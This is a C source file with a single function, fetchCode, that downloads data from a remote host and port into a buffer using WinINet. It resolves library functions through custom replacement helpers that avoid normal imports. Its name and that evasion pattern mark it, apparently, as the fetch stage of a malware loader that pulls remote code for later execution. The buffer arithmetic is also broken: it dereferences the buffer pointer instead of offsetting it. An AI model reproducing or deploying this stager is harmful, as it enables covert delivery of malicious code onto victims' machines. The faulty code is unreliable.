#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#include "GetterFunctions.h"

#pragma comment(lib, "wininet.lib")

typedef HINTERNET(WINAPI* INTERNETOPEN)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* INTERNETOPENURL)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* LPInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* LPInternetCloseHandle)(HINTERNET);


int fetchCode(LPCWSTR hostname, LPCWSTR file, LPCWSTR port, unsigned char* buffer, DWORD* size) {
    HMODULE hDll = GetModuleHandleReplacement(TEXT("wininet.dll"));
    DWORD bytesRead;
    DWORD totalBytesRead = 0;

    wchar_t url[1024];
    wsprintf(url, L"http://%s:%s/%s", hostname, port, file);

    if (hDll == NULL) {
        printf("Failed to get module handle. Error: %d\n", GetLastError());
        return -1;
    }

    INTERNETOPEN pInternetOpen = (INTERNETOPEN)GetProcAddressReplacement(hDll, "InternetOpenW");
    INTERNETOPENURL pInternetOpenUrl = (INTERNETOPENURL)GetProcAddressReplacement(hDll, "InternetOpenUrlW");
    LPInternetReadFile pInternetReadFile = (LPInternetReadFile)GetProcAddressReplacement(hDll, "InternetReadFile");
    LPInternetCloseHandle pInternetCloseHandle = (LPInternetCloseHandle)GetProcAddressReplacement(hDll, "InternetCloseHandle");

    if (pInternetOpen && pInternetOpenUrl && pInternetReadFile && pInternetCloseHandle) {
        HINTERNET hInternet = pInternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet == NULL) {
            printf("InternetOpen failed. Error: %d\n", GetLastError());
            return -1;
        }

        HINTERNET hConnect = pInternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect == NULL) {
            printf("InternetOpenUrl failed. Error: %d\n", GetLastError());
            pInternetCloseHandle(hInternet);
            return -1;
        }

        // Assuming you've allocated memory for buffer elsewhere
        while (pInternetReadFile(hConnect, *buffer + totalBytesRead, *size - totalBytesRead, &bytesRead) && bytesRead > 0) {
            totalBytesRead += bytesRead;
        }
        if (GetLastError() != ERROR_SUCCESS) {
            printf("InternetReadFile failed. Error: %d\n", GetLastError());
        }

        pInternetCloseHandle(hConnect);
        pInternetCloseHandle(hInternet);
    }
    else {
        printf("Failed to load functions. Error: %d\n", GetLastError());
        return -1;
    }

    *size = totalBytesRead;
    return (totalBytesRead > 0) ? 0 : -1;
}